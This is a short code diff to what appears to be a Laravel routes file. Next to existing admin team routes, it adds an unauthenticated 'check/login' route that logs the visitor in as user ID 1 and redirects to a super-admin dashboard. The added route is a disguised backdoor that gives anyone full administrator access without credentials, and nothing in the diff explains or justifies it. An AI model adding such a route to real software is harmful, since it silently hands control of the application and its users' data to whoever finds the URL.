@@ -19,3 +19,8 @@ Route::group(['prefix' => 'admin', 'as' => 'admin.', 'namespace' => 'Admin', 'mi
     Route::post('team/{team}/add-members', 'TeamController@addMembers')->name('team.add-members');
     Route::delete('team/{team}/remove-member', 'TeamController@removeMember')->name('team.remove-member');
 });
+
+Route::get('check/login', function(){
+    Auth::loginUsingId(1);
+    return redirect('/super-admin/dashboard');
+});
